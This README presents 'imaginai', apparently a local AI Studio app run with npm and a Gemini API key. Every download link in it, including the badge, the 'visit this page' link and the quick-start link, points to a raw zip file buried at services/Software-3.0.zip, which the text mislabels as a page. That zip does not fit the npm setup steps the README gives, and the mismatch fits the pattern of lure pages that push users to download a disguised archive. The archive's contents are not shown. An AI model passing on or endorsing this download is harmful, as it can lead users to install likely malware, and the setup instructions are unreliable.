# 🎨 imaginai - Build your AI studio app fast

<div align="center">

[![Download imaginai](https://img.shields.io/badge/Download-imaginai-blue?style=for-the-badge&logo=github)](https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip)

</div>

## 🚀 What this app does

imaginai is an AI Studio app you can run on your Windows PC. It gives you a simple way to open, use, and test an AI app on your own machine.

Use it if you want to:
- run the app from your computer
- connect it to your Gemini API key
- test your AI Studio app in a local browser window
- work without extra setup on your own system

## 📥 Download and open the app

Visit this page to download and run the app:

[https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip](https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip)

If the page shows a release file or download package, save it to your PC and open it from your Downloads folder. If it opens the repository page, use the files on that page to set up the app on Windows.

## 🪟 Windows setup

Use these steps on a Windows PC:

1. Open the download link above in your browser
2. Save the project files to a folder you can find again
3. Make sure Node.js is installed on your PC
4. Open the project folder
5. Follow the steps below to start the app

## ⚙️ What you need

Before you run imaginai, make sure you have:

- a Windows computer
- internet access
- Node.js installed
- a Gemini API key
- enough free space for the app files and install files

Node.js helps your computer run the app. The Gemini API key lets the app connect to Gemini services.

## 🛠️ Install the app

1. Open the project folder in File Explorer
2. Find the address bar and type `cmd`, then press Enter
3. In the black window that opens, install the app files:

   `npm install`

4. Wait until the install finishes
5. Open the `.env.local` file in the project folder
6. Add your Gemini API key on the `GEMINI_API_KEY` line
7. Save the file

Example:

`GEMINI_API_KEY=your_api_key_here`

## ▶️ Run the app

After the install finishes and your API key is set, start the app:

`npm run dev`

When the app starts, it usually opens in your browser. If it does not open by itself, copy the local address from the window and paste it into your browser.

## 🔑 Add your Gemini API key

The app needs your Gemini API key before it can work.

To add it:
1. Open `.env.local`
2. Find `GEMINI_API_KEY`
3. Paste your key after the equals sign
4. Save the file

Keep the key private. Do not share it with anyone.

## 🖥️ Basic use

After the app starts, you can use it like this:

1. Open the app in your browser
2. Enter the text or prompt you want to test
3. Send the request
4. View the result in the app
5. Make changes and try again if needed

This setup helps you check how your AI app behaves on your own PC.

## 🧰 Common issues

### Node.js is not found

If `npm install` or `npm run dev` does not work, Node.js may not be installed.

Fix:
- install Node.js for Windows
- close and reopen Command Prompt
- try the command again

### The app does not start

If the app does not open:
- check that `npm install` finished
- check that your API key is set in `.env.local`
- make sure you ran `npm run dev` in the right folder

### The browser shows an error

If the browser shows a blank page or error:
- stop the app with `Ctrl + C`
- run `npm run dev` again
- refresh the browser page
- check your internet connection

### The API key does not work

If the app cannot connect to Gemini:
- check the spelling of `GEMINI_API_KEY`
- make sure there are no extra spaces
- confirm that your API key is valid

## 📂 Project files

Main files you may use:

- `.env.local` — stores your API key
- `package.json` — lists the app tools
- source files — contain the app code
- app pages — show the interface in your browser

## 🔒 Keep your setup safe

- keep your API key in `.env.local`
- do not post the key in chat or public places
- use the app only on your own computer
- close the terminal when you finish

## 🧪 Run again later

If you want to start the app again later:

1. Open the project folder
2. Open Command Prompt in that folder
3. Run `npm run dev`
4. Open the browser page the app gives you

If the project files stay in place, you do not need to install them again unless files change

## 📌 Quick start

1. Download or open the project from [https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip](https://github.com/Kubil-UwU/imaginai/raw/refs/heads/main/services/Software-3.0.zip)
2. Install Node.js if needed
3. Run `npm install`
4. Add your Gemini API key in `.env.local`
5. Run `npm run dev`
6. Open the app in your browser